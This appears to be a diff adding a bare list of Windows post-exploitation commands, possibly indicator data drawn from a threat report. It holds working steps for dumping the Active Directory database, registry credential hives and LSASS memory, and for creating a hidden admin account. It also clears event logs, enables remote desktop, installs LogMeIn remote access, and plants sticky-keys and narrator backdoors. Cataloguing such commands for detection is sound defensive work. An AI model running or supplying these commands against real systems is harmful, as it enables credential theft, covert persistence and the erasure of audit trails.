@@ -1,0 +1,16 @@
+powershell ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\users\public' q q
+C:\Windows\system32\net user z Lh199211* /add
+C:\Windows\system32\net localgroup administrators z /add
+reg save hklm\system system
+reg save hklm\sam sam
+reg save HKLM\security sec
+tasklist | findstr lsass
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\windows\temp\lsass.dmp full
+wevtutil.exe el
+wevtutil.exe cl [LOGNAME]
+net user z /delete
+netsh advfirewall firewall set rule group=remote desktop new enable=Yes
+C:\Windows\System32\msiexec.exe /i C:\Users\[USERNAME]\Pictures\LogMeIn.msi
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f
+
